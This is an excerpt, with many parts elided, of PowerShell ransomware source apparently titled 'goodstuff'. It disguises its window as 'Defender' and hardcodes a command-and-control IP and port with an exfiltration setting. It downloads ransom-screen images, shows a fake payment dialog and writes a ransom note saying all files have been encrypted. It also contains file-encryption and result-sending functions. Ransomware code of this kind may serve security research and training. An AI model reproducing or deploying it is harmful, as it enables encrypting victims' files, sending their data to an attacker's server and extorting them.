...
$Host.UI.RawUI.WindowTitle = "Defender" 
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White" }

# Banner
function Show-Banner {"defender check"}
...
function Show-Help {
   ...
   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\goodstuff.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
   ...
   Write-Host ; Write-Host "        .\goodstuff.ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
...
$Mode = "-e"
$Directory = "c:\temp"
$PSRKey = "34.244.233.187"
$C2Server = "34.244.233.187"
$C2Port = "80"
$Exfil = "-x"
$C2Status = $null
...
Invoke-WebRequest -useb https://raw.githubusercontent.com/JoelGMSec/goodstuff/main/Demo/goodstuff.jpg -Outfile $env:temp\goodstuff.jpg
Invoke-WebRequest -useb https://raw.githubusercontent.com/JoelGMSec/goodstuff/main/Demo/goodstuff.ico -Outfile $env:temp\goodstuff.ico
...
$form.Text = "m"
$formIcon = New-Object system.drawing.icon ("$env:temp\goodstuff.ico") 
$form.Icon = $formicon  

$img = [System.Drawing.Image]::Fromfile("$env:temp\goodstuff.jpg")
...
$label.Text = "All your files have been encrypted by goodstuff!" 
$label.AutoSize = $true 
...
$okButton.add_Click({ 
[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Your payment order has been registered!', 'goodstuff Payment System',
...
Remove-Item $env:temp\goodstuff* -force
...
function SendResults {
   ...
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "goodstuff!" -NotMatch
...
function CreateReadme {
   $ReadmeTXT = "All your files have been encrypted by goodstuff!`nBut don't worry, you can still recover them with the recovery key :)`n"
...
function EncryptFiles { 
   ...
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "goodstuff!" -NotMatch ; if (!$RansomLogs) { 
